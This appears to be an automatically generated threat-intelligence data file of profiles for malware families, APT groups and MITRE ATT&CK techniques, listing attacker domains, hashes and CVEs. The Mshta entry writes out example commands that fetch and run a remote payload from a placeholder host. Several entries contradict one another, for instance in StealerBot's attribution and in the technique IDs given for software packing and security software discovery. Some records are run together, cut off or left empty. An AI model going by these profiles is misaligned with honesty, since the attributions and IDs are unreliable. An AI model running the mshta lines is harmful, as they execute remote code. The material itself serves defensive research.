14458.name: Kimsuky
14458.profile_without_enhance_5: [profile]Kimsuky, also known as Kimsuki, is a malware family attributed to the North Korean APT group Kimsuky. It employs techniques such as Boot or Logon Autostart Execution (T1547) for persistence, System Binary Proxy Execution (T1218) for defense evasion, and Phishing (T1566) and User Execution (T1204) for initial access and execution. It collects data via Email Collection (T1114) and has been observed using open-source tools like the Metasploit Meterpreter backdoor. It primarily targets individuals and organizations in South Korea, Japan, and the United States, focusing on foreign policy, national security, nuclear policy, and sanctions. Associated infrastructure includes domains like nomera.n-e.kr and nauji.n-e.kr.[profile]

14459.name: BabyShark
14459.profile_without_enhance_5: [profile]BabyShark is a malware family associated with the Kimsuky group. It employs techniques including System Binary Proxy Execution (T1218) to evade defenses, Boot or Logon Autostart Execution (T1547) for persistence, and Email Collection (T1114). Initial access is often gained via Phishing (T1566) and User Execution (T1204). It uses VBS and HTA scripts, and its payloads are encrypted, requiring a decrypt function. Infrastructure includes domains like nocamoto.o-r.kr, peras1.n-e.kr, onsungtong.n-e.kr, vamboo.n-e.kr, and download.uberlingen.com.[profile]

14485.name: T1114
14485.profile_without_enhance_5: [profile]T1114, Email Collection, is a Collection technique targeting macOS, Linux, Windows, and Office Suite platforms. Adversaries collect or forward sensitive data from user email clients or mail servers, which can include trade secrets, personal information, or incident response details. This activity is often followed by related actions like clearing mailbox data to remove evidence, as seen in groups like Silent Librarian and Scattered Spider.[/profile]

14486.name: Email Collection
14486.profile_without_enhance_5: [profile]Email Collection is identified as MITRE ATT&CK technique T1114 under the Collection tactic. It targets sensitive data from user email on platforms including Windows, Office 365, and Google Workspace. Adversaries collect or forward emails directly from mail servers or clients, using credentials or access tokens for remote access to services like Exchange, Office 365, or Google Workspace, and locally by acquiring files such as Outlook .ost or .pst data files. Tools like MailSniper can automate keyword searches within collected mailboxes.

14489.name: 64677CAE14A2EC4D393A81548417B61B
14489.profile_without_enhance_5: [profile]The malware identified by hash 64677CAE14A2EC4D393A81548417B61B is a Remote Access Trojan (RAT) and is associated with the malware families Snatch, ElectroRAT, and NjRAT. It has been attributed to threat groups including Aquatic Panda, Earth Lusca, Operation C-Major, and The Gorgon Group. Its key techniques include using rootkits (T1014) for defense evasion, capturing user input (T1056) for credential theft, and exfiltrating data in size-limited chunks (T1030) to avoid detection. It also performs indicator removal (T1070) and can be delivered via supply chain compromise (T1195). Its primary targets are systems in the Republic of Korea, Japan, and the United States.[/profile]

14490.name: T1560
14490.profile_without_enhance_5: [profile]T1560, Archive Collected Data, is a Collection technique within the MITRE ATT&CK framework applicable to Windows, Linux, and macOS. It involves compressing and/or encrypting collected data prior to exfiltration to obfuscate the content and reduce network footprint, which can be performed using utilities, third-party libraries, or custom methods. This technique is commonly used as part of data staging (T1074.001) before the data is moved off the victim system.

14491.name: T1030
14491.profile_without_enhance_5: [profile]T1030 (Data Transfer Size Limits) is an adversary technique within the Exfiltration tactic applicable to Windows, Linux, macOS, and ESXi platforms. It involves exfiltrating data in fixed-size chunks or limiting packet sizes below certain thresholds to avoid triggering network data transfer monitoring alerts.

14492.name: T1014
14492.profile_without_enhance_5: [profile]T1014 (Rootkit) is a defense-evasion technique used on Windows, Linux, and macOS. It hides malware by intercepting and modifying operating system API calls to conceal programs, files, network connections, or other system components. Rootkits can operate at the user or kernel level, or even lower in a hypervisor or system firmware, with bootkits specifically targeting the boot process. It has been associated with groups like APT28 and APT41.

14493.name: Data Transfer Size Limits
14493.profile_without_enhance_5: [profile]Data Transfer Size Limits, identified as T1030, is an Exfiltration technique applicable to Windows, Linux, macOS, and ESXi platforms. It involves exfiltrating data in fixed-size chunks or limiting packet sizes below detection thresholds to avoid triggering network data transfer alerts. This method has been associated with groups like APT41, APT28, and LuminousMoth.

14494.name: Rootkit
14494.profile_without_enhance_5: [profile]Rootkit is MITRE ATT&CK technique T1014 under the Defense Evasion tactic, targeting Windows, Linux, and macOS platforms. It hides malware by intercepting and modifying operating system API calls to conceal programs, files, network connections, and other components. Rootkits can operate at the user or kernel level, or lower in the system stack like in a hypervisor. A related variant, the Bootkit (T1542.003), persists by modifying the Master Boot Record or Volume Boot Record. Kernel-mode rootkits often use Loadable Kernel Modules (Linux) or kernel extensions (macOS) to gain high-privilege persistence and provide backdoors.

14496.name: Archive Collected Data
14496.profile_without_enhance_5: [profile]Archive Collected Data, identified as T1560 within the MITRE ATT&CK framework, is a Collection tactic technique applicable to Windows, Linux, and macOS. It involves compressing and/or encrypting collected data prior to exfiltration to obfuscate the content and minimize network footprint. This can be achieved using standard system utilities like `tar`, `zip`, `makecab`, or `certutil`, third-party libraries such as zlib or Python's rarfile, or through custom implementation methods. The technique is commonly associated with data staging procedures (T1074) and is employed by numerous threat groups including APT28, Lazarus Group, and FIN6.[/profile]

14498.name: XenoRAT
14498.profile_without_enhance_5: [profile]XenoRAT is a remote access tool (RAT) written in C# and compatible with Windows 10 and 11. Its key technical behaviors include exfiltrating data to cloud storage (T1567.002), collecting clipboard data (T1115), and establishing command and control using application layer protocols like HTTP (T1071) with traffic obfuscated via standard data encoding (T1132.001) and symmetric cryptography (T1573.001). It has been delivered in malicious documents such as 'krumhan.rtf' and 'bobokan.rtf'.[/profile]

14508.name: T1567.002
14508.profile_without_enhance_5: [profile]T1567.002, known as Exfiltration to Cloud Storage, is an exfiltration technique within the MITRE ATTACK framework applicable to Windows, Linux, macOS, and ESXi platforms. It involves adversaries transferring stolen data to internet-based cloud storage services like Dropbox or Google Docs. This method can provide operational cover by blending malicious data transfers with legitimate organizational traffic to these common services, as observed in activities by groups like Hafnium, FIN7, and Wizard Spider.

14509.name: T1567.001
14509.profile_without_enhance_5: [profile]T1567.001, known as Exfiltration to Code Repository, is an Exfiltration technique applicable to Windows, Linux, macOS, and ESXi platforms. It involves exfiltrating stolen data to a code repository service like GitHub, often using its HTTPS-based API. This method provides adversaries with additional protection by blending data transfer with legitimate, commonly-used network traffic, offering a layer of operational cover.

14510.name: Exfiltration to Code Repository
14510.profile_without_enhance_5: [profile]Exfiltration to Code Repository (T1567.001) is an Exfiltration technique used on Windows, Linux, macOS, and ESXi platforms. Adversaries exfiltrate data to a code repository via its API, such as https://api.github.com, often over HTTPS for added protection. This method can provide significant cover if the repository service is already in common use within the victim network, blending malicious traffic with legitimate activity.

14512.name: SnakeKeylogger
14512.profile_without_enhance_5: [profile]SnakeKeylogger, also known as trojan.49424.sl, is a keylogger attributed to unknown groups. Its key technical behaviors include keylogging (T1056.001) to capture credentials and exfiltration over a command and control channel (T1041). It specifically targets credentials from web browsers (T1555.003) and can be delivered via spearphishing attachments (T1566.001) or Visual Basic execution (T1059.005). The malware operates on Windows, Linux, and macOS platforms and uses infrastructure like srvdown.ddns.net for C2. It has been observed exfiltrating data to a Telegram bot and is associated with loaders like PureCrypter and DBatLoader.[/profile]

14523.name: vmmisc.ko
14523.profile_without_enhance_5: [profile]vmmisc.ko is a malware module targeting Linux systems, as indicated by its .ko (kernel object) extension. It is associated with domains such as webcloud-notice.com, wuzak.com, koala-app.com, and nid-security.com, which likely serve as command and control infrastructure. The malware checks for the presence of VirtualBox guest modules (vboxguest, vboxsf, vboxvideo) in the /sys/module directory, a behavior shared with or similar to the ztorg malware, suggesting it may perform virtualization detection to evade analysis in sandboxed environments. Its primary targets are systems in Taiwan.[/profile]

14547.name: QuasarRAT
14547.profile_without_enhance_5: [profile]QuasarRAT, also known as Quasar RAT, is a Remote Access Trojan (RAT) associated with threat groups including APT33, Dropping Elephant, Stone Panda, and The Gorgon Group. Its key technical behaviors involve using Mark-of-the-Web Bypass (T1553.005) for defense evasion, employing GUI Input Capture (T1056.002) for credential theft, and utilizing Data Encoding (T1132) like Base64 for command-and-control (C2) obfuscation. It also uses steganography (T1001.002) to hide C2 traffic and hides files and directories (T1158). It primarily targets Windows systems and has been linked to infrastructure domains such as cukumam.shop, bikaro.store, and login.androclesproject.o-r.kr. It shares configuration similarities with other RATs like AsyncRAT and Venom RAT.[/profile]

14598.name: T1566.002
14598.profile_without_enhance_5: [profile]T1566.002, Spearphishing Link, is an Initial Access technique within the MITRE ATT&CK framework applicable to Windows, Linux, macOS, and SaaS platforms. It involves sending targeted emails containing malicious links to bypass attachment-based defenses. The attack requires user interaction to click the link, which may lead to browser exploitation, malicious file downloads, or credential harvesting via deceptive OAuth or device authorization flows. Adversaries often obfuscate URLs using hexadecimal formats or "@" symbols and employ social engineering to pose as a trusted source.

14599.name: Spearphishing Link
14599.profile_without_enhance_5: [profile]Spearphishing Link, identified as MITRE ATT&CK T1566.002, is an Initial Access technique targeting macOS, Linux, Windows, and SaaS platforms. It involves sending tailored emails containing malicious links, bypassing attachment-based defenses by prompting user execution to click or paste a URL. The link leads to a website that may exploit the browser, trigger a malicious download, or direct to cloned login pages for credential harvesting. Adversaries often obfuscate URLs using special characters, homograph attacks, or link shortening services, and may use these links in OAuth consent phishing to steal application access tokens.

14637.name: T1589.001
14637.profile_without_enhance_5: [profile]T1589.001, also known as Credentials, is a reconnaissance technique under the MITRE ATT&CK framework, applicable to the PRE platform. It involves adversaries gathering credentials from potential victims through methods like direct elicitation via phishing, compromising websites to collect authentication cookies, or accessing credentials exposed in online data sets such as search engines, breach dumps, and code repositories. Credentials may also be purchased from dark web markets or Telegram channels distributing infostealer logs. This gathered information can enable further reconnaissance, resource establishment, or initial access.

14640.name: RDP Wrapper
14640.profile_without_enhance_5: [profile]RDP Wrapper is a malware family. It is referenced in the context of other malware families or campaigns named 'pebbledash', 'appleseed', and 'void', with the 'appleseed' campaign being attributed to the Kimsuky group. A related indicator is the file hash 3211ef223177310021e174c928f96bab. The malware's activity involves targeting RDP (Remote Desktop Protocol) servers, as suggested by its name and related discussions of server compromises and decryptors.[/profile]

14642.name: PebbleDash
14642.profile_without_enhance_5: [profile]PebbleDash, also known as pebbledash, is attributed to the Kimsuky APT group. It is a custom ransomware that can be deployed as a third-stage payload, controlled via command-line parameters, and can retrieve its encryption key either from a command-and-control server or via launch arguments. Its infrastructure includes the indicator 3211ef223177310021e174c928f96bab.[/profile]

14656.name: FPSpy
14656.profile_without_enhance_5: [profile]FPSpy is a malware tool associated with the Kimsuky (also known as Kimsuki) threat group. It employs keylogging (T1056.001) and screen capture (T1113) for credential access and collection, stages collected data (T1074), and uses automated exfiltration (T1020) with data encoding (T1132) for command-and-control. Its infrastructure includes domains like nidlogin.apollo.r-e.kr and mail.apollo-page.r-e.kr, and it has been linked to a registrant email also used by the KLogEXE malware. Targets include systems in Japan.[/profile]

14657.name: KLogEXE
14657.profile_without_enhance_5: [profile]KLogEXE is a keylogger malware attributed to the APT group Sparkling Pisces (also known as Kimsuky). It captures keystrokes using the GetKeyState API and logs data to a local file in a format containing date, title bar, and content. Its technical behaviors include data staging and automated exfiltration, and it uses command and control infrastructure such as the domains mail.apollo-page.r-e.kr and nidlogin.apollo.r-e.kr, primarily targeting systems in Japan.[/profile]

14687.name: T1048.003
14687.profile_without_enhance_5: [profile]T1048.003, Exfiltration Over Unencrypted Non-C2 Protocol, is an exfiltration technique applicable to Windows, Linux, macOS, ESXi, and Network Devices. It involves stealing data by sending it over a native, unencrypted network protocol like HTTP, FTP, or DNS that is separate from the command and control channel. To avoid detection, adversaries may obfuscate the stolen data within these protocols using methods such as base64 encoding or by embedding information within protocol headers and fields, all without employing encryption. This technique has been associated with groups including FIN6, Lazarus Group, and APT33.

14694.name: T1027.002
14694.profile_without_enhance_5: [profile]T1027.002, also known as Software Packing, is a Defense Evasion technique applicable to Windows, Linux, and macOS. It involves compressing or encrypting an executable to alter its file signature and evade signature-based detection, with the original code typically being decompressed in memory during execution. Adversaries use packers like MPRESS and UPX or create custom packing methods, and this technique is employed by groups including APT41, APT29, and Volt Typhoon. It has been associated with the exploitation of vulnerability CVE-2023-27350.

14695.name: T1218.005
14695.profile_without_enhance_5: [profile]T1218.005, also known as Mshta, is a defense-evasion technique for Windows that abuses the trusted mshta.exe utility to proxy execution of malicious code. It works by executing Microsoft HTML Application (HTA) files or inline scripts, such as `mshta vbscript:Close(Execute("GetObject(\"script:https[:]//webserver/payload[.]sct\")"))` or directly from a URL like `mshta http[:]//webserver/payload[.]hta`, to bypass application control and browser security settings. This technique is used by groups including FIN7, MuddyWater, and Lazarus Group.

14696.name: Tromas
14696.profile_without_enhance_5: [profile]Tromas is a malware entity. Its key technical behaviors include using the Msiexec technique (T1218.007) to proxy malicious payload execution, employing Process Injection (T1055), Masquerading (T1036), and Obfuscating Files or Information (T1027) for defense evasion, and relying on User Execution of malicious files (T1204.002) for initial execution. It targets the Windows platform.

14697.name: T1218.007
14697.profile_without_enhance_5: [profile]T1218.007, also known as Msiexec, is a Defense Evasion technique for Windows. It involves abusing the msiexec.exe command-line utility to proxy execution of malicious payloads, including local or network MSI files and DLLs. This native, often digitally signed binary can bypass application control and, if the AlwaysInstallElevated policy is enabled, execute with elevated SYSTEM privileges. It has been associated with groups including Rancor, APT38, Machete, Zirconium, TA505, and Molerats.

14698.name: unkown_apt_group
14698.profile_without_enhance_5: [profile]This intrusion set, likely the APT group known as Lotus Panda (also known as Lotus Blossom, Red Salamander, ST Group, and Spring Dragon), has been observed using the Tromas malware, which leverages the Msiexec technique (T1218.007) for defense evasion and payload execution. The group also employs Cobalt Strike and utilizes TTPs including Python execution (T1059.006), Screen Capture (T1113), Software Packing (T1027.002), and Query Registry (T1012). Its operations show unexpected overlaps with other APT groups, and it is believed to target Windows systems, though specific sectors, regions, and motivations are not detailed in the provided information.[/profile]

14699.name: Msiexec
14699.profile_without_enhance_5: [profile]Msiexec is MITRE ATT&CK technique T1218.007, a Defense Evasion technique for Windows. It involves abusing the legitimate msiexec.exe command-line utility to proxy execution of malicious payloads, including local/network MSI files and DLLs, to bypass application controls. Its execution can be elevated to SYSTEM privileges if the 'AlwaysInstallElevated' policy is enabled.

14700.name: T1059.006
14700.profile_without_enhance_5: [profile]T1059.006, known as Python within the MITRE ATT&CK framework, is an execution technique applicable to Windows, Linux, macOS, and ESXi platforms. Adversaries abuse the Python interpreter (`python.exe`) or `.py` scripts to perform malicious functions, leveraging built-in packages for system interaction, file operations, and device I/O to download and execute commands. This technique is associated with groups including APT37, MuddyWater, and APT29.

14701.name: Cobalt Strike
14701.profile_without_enhance_5: [profile]Cobalt Strike is a commercial penetration testing tool repurposed as a malware family, also known as Cobalt. It is attributed to or used by groups including APT29, APT32, APT41, FIN6, FIN7, Wizard Spider, TA2101, and Pinchy Spider. Key technical behaviors include using Office Template Macros for persistence, employing Encrypted Channels for command and control (C2), utilizing Software Packing for defense evasion, performing System Owner/User Discovery, and executing Process Injection. It primarily targets Windows systems, with associated C2 infrastructure domains such as projectextracted.com, alexbionka.com, wiandukachelly.com, ultomductingbig.pro, asureupdate.tech, and akamaclouds.app.[/profile]

14702.name: Software Packing
14702.profile_without_enhance_5: [profile]Software Packing, designated as MITRE ATT&CK T1045 (based on retrieved info alignment), is a Defense Evasion technique used across Windows, Linux, and macOS platforms. It involves compressing or encrypting an executable to alter its file signature and evade signature-based detection, with the packed code typically decompressed in memory during execution. Common packer utilities include MPRESS and UPX, though adversaries often employ custom packers to avoid known artifacts. This technique is also referenced in relation to Indicator Removal from Tools, where it is used to modify malware signatures after detection. Associated threat groups include APT41, APT29, and Volt Typhoon.[/profile]

14704.name: unkown_apt_group
14704.profile_without_enhance_5: [profile]This intrusion set, likely associated with the SideWinder APT (also known as Razor Tiger or Sloppylemming), uses malware including Module Installer, Downloader Module, and StealerBot, and has been linked to Sidewinder malware. Key TTPs involve exploitation of CVE-2017-11882 and CVE-2017-0199, Application Window Discovery (T1010), Template Injection (T1221), and persistence via Boot or Logon Autostart Execution (T1547) and Office Application Startup (T1137). It is attributed to an Indian threat actor group and primarily targets entities in South Asia and Africa, including Pakistan, Bangladesh, Sri Lanka, Mozambique, Djibouti, Uganda, and the Maldives, with motivations likely aligned with espionage. The group's infrastructure includes domains like grouit.tech, dowmload.net, and dgps-govpk.co.[/profile]

14779.name: T1221
14779.profile_without_enhance_5: [profile]T1221, known as Template Injection, is a Defense Evasion technique on Windows. It involves adversaries inserting malicious references into document templates, such as Microsoft Office OOXML or RTF files, to fetch and execute remote payloads when the document is opened. This method can evade static detection and has been used to deliver exploits or force SMB authentication attempts, as seen with groups like Gamaredon Group and APT28. A related vulnerability is CVE-2017-11882.

14781.name: T1518.001
14781.profile_without_enhance_5: [profile]T1518.001 - Security Software Discovery is a Discovery technique for macOS, Linux, Windows, and IaaS platforms. Adversaries enumerate installed security tools like antivirus, cloud monitoring agents (e.g., AWS CloudWatch, Azure VM Agent), and host-based sensors (e.g., LittleSnitch on macOS) to inform follow-on actions. Discovery is performed using commands like `netsh`, `reg query`, `dir`, and `tasklist`, or via Cloud APIs for cloud-native agents. It is commonly associated with groups including Wizard Spider, Turla, and APT38.

14782.name: T1480
14782.profile_without_enhance_5: [profile]T1480 - Execution Guardrails is a Defense Evasion technique applicable to Windows, Linux, macOS, and ESXi platforms. It constrains malicious payload execution to specific intended targets by checking for adversary-supplied environmental conditions, such as particular network share names, attached devices, files, Active Directory domains, or IP addresses. This ensures the payload only runs in the correct environment, preventing exposure and reducing collateral damage. A sub-technique, Environmental Keying (T1480.001), uses cryptographic techniques to derive decryption keys from these environmental values. The technique is distinct from sandbox evasion, as it requires a positive match to proceed.

14783.name: Execution Guardrails
14783.profile_without_enhance_5: [profile]Execution Guardrails, identified as T1480, is a Defense Evasion technique used across Windows, Linux, macOS, and ESXi platforms. It constrains payload execution by checking for adversary-supplied, target-specific environmental conditions before proceeding, thereby reducing collateral damage and preventing exposure in unintended environments. This involves verifying the presence of specific elements like network share names, attached devices, files, Active Directory domains, or IP addresses. A specific sub-technique, Environmental Keying (T1480.001), uses cryptographic methods to derive decryption keys from these environmental values, making analysis and detection more difficult. The technique is distinct from sandbox evasion as it requires a positive match to proceed.[/profile]

14785.name: Security Software Discovery
14785.profile_without_enhance_5: [profile]Security Software Discovery, identified as MITRE ATT&CK T1063, is a Discovery tactic used on Windows, Linux, macOS, and IaaS platforms. Adversaries enumerate security software, configurations, and defensive tools like antivirus and firewalls to inform follow-on actions. Specific technical mechanics include using commands such as `netsh`, `reg query`, `dir`, and `Tasklist` on Windows, while macOS malware often checks for LittleSnitch and KnockKnock software. This technique is distinct from general software discovery, focusing specifically on security-related applications and agents.

14796.name: Template Injection
14796.profile_without_enhance_5: [profile]Template Injection, known as T1221, is a Defense Evasion technique primarily targeting Windows platforms. It involves modifying document templates, such as inserting a remote URL reference into an Office Open XML (OOX) document part or altering the *\template control word in an RTF file, to fetch and execute a malicious payload when the document is opened. This method evades static detection as the malicious code is not embedded initially, and it can also be used to force authentication via SMB/HTTPS URLs. It is associated with groups like Gamaredon Group and APT28.

14802.name: Downloader Module
14802.profile_without_enhance_5: [profile]Downloader Module is a malware component used to retrieve and execute additional payloads. Its associated indicators include domains like zeltech.live, aliyum.email, pncert.info, dowmload.co, and mteron.info. It leverages the CVE-2017-11882 vulnerability for exploitation. Its technical behaviors involve Boot or Logon Autostart Execution for persistence, Compile After Delivery for defense evasion, and Security Software Discovery and Query Registry for system reconnaissance. It has been deployed in attacks targeting Mozambique, Maldives, Djibouti, Uganda, and Sri Lanka.[profile]

14803.name: Module Installer
14803.profile_without_enhance_5: [profile]Module Installer is a malware installer that utilizes the T1547 Boot or Logon Autostart Execution technique for persistence, the Compile After Delivery (T1027.004) technique for defense evasion, and T1203 Exploitation for Client Execution, potentially leveraging CVE-2017-11882. It is associated with infrastructure indicators like pncert.info, dirctt888.info, and document-viewer.live. Related content suggests it may share technical behaviors with other installers like PlugX, which uses a hardcoded IV for decryption, and it has been deployed against targets in locations including the Maldives, Mozambique, Rwanda, Djibouti, and Uganda.

14805.name: StealerBot
14805.profile_without_enhance_5: [profile]StealerBot is a malware entity, not a family, that functions as an information stealer. It is delivered by the Mangzamel malware and is associated with the Red Menshen group. Its technical behaviors include achieving persistence via Boot or Logon Autostart Execution (T1547), evading detection via Compile After Delivery (T1027.004), and performing discovery via Security Software Discovery (T1063) and Query Registry (T1012). It exploits the CVE-2017-11882 vulnerability for client execution (T1203). Its known infrastructure includes domains like aliyum.email, modpak.info, and dirctt888.com, and it has targeted victims in Bangladesh, Maldives, Djibouti, Mozambique, and Sri Lanka.[profile]

14878.name: T1027.004
14878.profile_without_enhance_5: [profile]T1027.004, Obfuscated Files or Information: Compile After Delivery, is a Defense Evasion technique for macOS, Linux, and Windows. Adversaries deliver payloads as uncompiled source code to evade detection targeting binaries, requiring compilation on the victim system using native utilities like csc.exe or GCC. These text-based files can be further obfuscated through encryption or embedding within other files, such as phishing attachments. The technique has been used by groups including Gamaredon Group and MuddyWater.

14879.name: Compile After Delivery
14879.profile_without_enhance_5: [profile]Compile After Delivery is a Defense Evasion technique (T1027.004) used on Windows, Linux, and macOS. Adversaries deliver payloads as uncompiled source code (e.g., C#, C++) to bypass defenses targeting binaries, requiring on-victim compilation using native utilities like csc.exe, MSBuild, or GCC. The code may be obfuscated within documents like phishing attachments. This method has been used by groups including MuddyWater and Gamaredon Group.

15178.name: Sidewinder
15178.profile_without_enhance_5: [profile]Sidewinder is a malware attributed to the SideWinder APT, an Indian threat actor group targeting Pakistan, and is also associated with aliases or groups like Razor Tiger and Sloppylemming. Its key TTPs include Application Window Discovery (T1010), Office Application Startup (T1137), Template Injection (T1221), Supply Chain Compromise (T1195), and Boot or Logon Autostart Execution (T1547), primarily targeting Windows platforms. It uses infrastructure like webdisk.govpk.info, mopf-gov-mm.direct888.net, boket.tech, defencelk.cvix.live, and mofadividion.ptcl-gov.com, and has been observed using NameSilo for domain registration.[/profile]

15405.name: T1216
15405.profile_without_enhance_5: [profile]T1216 (System Script Proxy Execution) is a defense-evasion technique for Windows. It involves adversaries abusing trusted, often Microsoft-signed, system scripts (e.g., from the LOLBAS project) to proxy and execute malicious files. This method can bypass application control and signature validation mechanisms.

15406.name: T1010
15406.profile_without_enhance_5: [profile]T1010, Application Window Discovery, is a Discovery technique used on Windows, Linux, and macOS. It involves adversaries using native system features like command interpreters or API calls to list open application windows. This reconnaissance helps identify user activity, potential data for collection, and security software to evade, as seen in campaigns by groups like Lazarus Group, Hexane, and Volt Typhoon.

15407.name: System Script Proxy Execution
15407.profile_without_enhance_5: [profile]System Script Proxy Execution is MITRE ATT&CK technique T1216 under the Defense Evasion tactic for Windows. It involves abusing trusted, often Microsoft-signed, system scripts to proxy and execute malicious files or commands, thereby bypassing application control and signature validation. Specific sub-techniques include using PubPrn.vbs to execute remote scriptlet files and SyncAppvPublishingServer.vbs to proxy PowerShell commands.

15408.name: T1193
15408.profile_without_enhance_5: [profile]T1193, known as Spearphishing Attachment, is an Initial Access technique. It involves sending a targeted email with a malicious attachment, such as an Office document, executable, PDF, or archive. The email uses social engineering to prompt the recipient to open the file, often instructing how to bypass protections or decrypt it. Execution typically relies on User Execution (T1204), where opening the attachment exploits a vulnerability or directly runs the adversary's payload. Adversaries may also manipulate file extensions and icons to disguise the malicious file.

15409.name: T1107
15409.profile_without_enhance_5: [profile]T1107, also known as File Deletion, is a Defense Evasion technique. It involves adversaries deleting files, such as malware or tools, left on a system after intrusion to remove forensic evidence and minimize their footprint. This action can be performed during or after the intrusion using native OS commands like `DEL`, utilities such as Windows Sysinternals SDelete, or other third-party deletion tools.

15410.name: Application Window Discovery
15410.profile_without_enhance_5: [profile]Application Window Discovery, identified as T1010 within the MITRE ATT&CK framework, is a Discovery tactic technique applicable to Windows, Linux, and macOS platforms. It involves adversaries enumerating open application windows to understand system usage, identify data for collection, and discover security software to evade. This is typically performed by abusing native system features like Command and Scripting Interpreter commands and Native API functions, as observed in activities linked to groups like Lazarus Group, Hexane, and Volt Typhoon.

15457.name: Gelsemium - S0666
15457.profile_without_enhance_5: [profile]Gelsemium - S0666, also known as Gelsemium, is a modular malware attributed to the Gelsemium group. It consists of a dropper (Gelsemine), a loader (Gelsenicine), and main plug-ins (Gelsevirine) written using the Microsoft Foundation Class (MFC) framework. Its infrastructure includes domains like acro.ns1.name, info.96html.com, microsoftservice.dns1.us, dsdsei.com, and pctftp.otzo.com, and it has targeted locations such as Singapore, the Philippines, and Taiwan.[/profile]

15458.name: Project Wood
15458.profile_without_enhance_5: [profile]Project Wood is a malware entity with known aliases including Firewood. It is attributed to the Blackwood group. Key technical behaviors include a Windows 32-bit version and a recently discovered Linux variant, indicating cross-platform targeting. Its infrastructure involves domains such as info.96html.com, asidomain.com, domain.dns04.com, dsdsei.com, and www.sitesafecdn.dynamic-dns.net, with observed targeting in Singapore, the Philippines, and Taiwan.[/profile]

15460.name: Gelsemium
15460.profile_without_enhance_5: [profile]Gelsemium, also known as Gelsemine, Gelsenicine, and Gelsevirine, is a modular malware family attributed to the Gelsemium group and potentially associated with APT-C-36 and UNC2452. It has targeted entities in Singapore, the Philippines, and Taiwan, and uses infrastructure such as www.travel.dns04.com, microsoftservice.dns1.us, and traveltime.hopto.org.[/profile]

15461.name: FireWood
15461.profile_without_enhance_5: [profile]FireWood is a backdoor malware attributed to the Gelsemium group. The malware has targeted systems in Iran, Singapore, the Philippines, and Taiwan, using infrastructure such as the domains acro.ns1.name and www.sitesafecdn.dynamic-dns.net. A low-detected variant with changes in implementation and configuration has been identified.

15462.name: WolfsBane
15462.profile_without_enhance_5: [profile]WolfsBane is a malware entity with infrastructure indicators including the domains asidomain.com, www.travel.dns04.com, domain.dns04.com, and www.sitesafecdn.dynamic-dns.net, and the rootkit rootkit.agent.ec. It has been observed targeting systems in Singapore, the Philippines, and Taiwan. Retrieved content suggests potential associations with the groups FIN6 and TA2101, which are linked to the TWISTED SPIDER campaign, and it may share contextual connections with malware families like Latrodectus and ACR Stealer.[/profile]

15463.name: unkown_apt_group
15463.profile_without_enhance_5: [profile]The intrusion set is most likely the Gelsemium group, also known as APT-C-36 and UNC2452. Its key malware includes the modular Gelsemium family (comprising dropper, loader, and plugins), FireWood, Project Wood, and WolfsBane. Its TTPs involve rootkits (T1014), indicator removal (T1070), encrypted C2 channels (T1573), and the use of non-standard ports (T1571). The group is attributed to Chinese state-sponsored actors and has primarily targeted entities in Singapore, the Philippines, Taiwan, and Iran. 15551.name: SpyPress.MDAEMON

15552.name: SpyPress.ZIMBRA
15552.profile_without_enhance_5: [profile]SpyPress.ZIMBRA is a malware targeting Zimbra Collaboration Suite (ZCS) email servers, exploiting vulnerabilities including CVE-2024-27443, CVE-2023-43770, CVE-2024-11182, CVE-2020-35730, and CVE-2023-23397. Its infrastructure involves domains like skiff.com, global-world-news.net, jiaw.shop, ceriossl.info, and tgh24.xyz, with observed activity targeting entities in Romania, Serbia, Cameroon, Cyprus, and Greece. 15553.name: SpyPress.ROUNDCUBE
15553.profile_without_enhance_5: [profile]SpyPress.ROUNDCUBE, a JavaScript payload, is part of the SpyPress malware family and is used to target vulnerable webmail clients. It has been observed in campaigns attributed to the Sednit group (also known as APT28 or Fancy Bear). Associated infrastructure includes domains like hijx.xyz, ikses.net, lsjb.digital, and tgh24.xyz, and it exploits vulnerabilities such as CVE-2024-11182, CVE-2020-35730, CVE-2023-43770, CVE-2024-27443, and CVE-2023-23397, with victim organizations located in Romania, Cameroon, Serbia, Cyprus, and Greece.[/profile]

15554.name: SpyPress.HORDE
15554.profile_without_enhance_5: [profile]SpyPress.HORDE, also known as a SpyPress payload, is a JavaScript-based malware that targets vulnerable webmail clients like Horde. The malware has been associated with Sednit campaigns and has been observed using domains such as skiff.com, victim.org, lsjb.digital, tgh24.xyz, and ceriossl.info, with potential connections to locations including Romania, Serbia, Cameroon, Cyprus, and Greece. It exploits vulnerabilities including CVE-2024-11182, CVE-2020-35730, CVE-2023-43770, CVE-2024-27443, and CVE-2023-23397.[/profile]

15555.name: unkown_apt_group
15555.profile_without_enhance_5: [profile]This intrusion set is strongly attributed to APT28, also known as Fancy Bear or Sednit. Its key malware includes the SpyPress family (SpyPress.ROUNDCUBE, SpyPress.ZIMBRA, SpyPress.MDAEMON, SpyPress.HORDE) and LAMEHUG. Its TTPs involve exploiting specific vulnerabilities (CVE-2024-11182, CVE-2023-43770, CVE-2024-27443, CVE-2020-35730) against webmail servers, using Office Template Macros (T1137.001) for persistence, and performing Permission Groups Discovery (T1069). The group is believed to be Russian state-sponsored and has targeted entities in regions including Ukraine, Romania, Serbia, Cameroon, Cyprus, and Greece, primarily for espionage.

15589.name: GooseEgg
15589.profile_without_enhance_5: [profile]GooseEgg is a tool attributed to APT28 that exploits the Windows Print Spooler vulnerability CVE-2022-38028 for privilege escalation by manipulating a JavaScript constraints file to execute with SYSTEM permissions. Its associated techniques include exploiting accessibility features (T1546.008), abusing BITS jobs (T1197), dumping the SAM database (T1003.002), bypassing User Account Control (T1548.002), and general exploitation for privilege escalation (T1068). It primarily targets Windows platforms and has been observed in operations against Ukraine and the United States.

15596.name: T1546.012
15596.profile_without_enhance_5: [profile]T1546.012, known as Image File Execution Options Injection, is a Windows-specific technique for Persistence and Privilege Escalation. It works by modifying the Windows Registry to set a malicious debugger or monitor program for a target executable via the Image File Execution Options (IFEO) key, such as HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\<executable>. This causes the system to launch the specified malicious process instead of or alongside the legitimate application, often with elevated privileges, when the target executable is invoked. The modification can be made directly in the Registry or using tools like GFlags.

15598.name: T1505.001
15598.profile_without_enhance_5: [profile]T1505.001 (SQL Stored Procedures) is a persistence technique for Linux and Windows platforms. It involves adversaries creating or modifying SQL stored procedures, which are reusable code blocks in databases, to maintain access. This often requires enabling additional database functionality like `xp_cmdshell` in MSSQL to execute operating system commands or leveraging CLR integration to run arbitrary .NET code, turning the database server into a persistent foothold.

15599.name: T1197
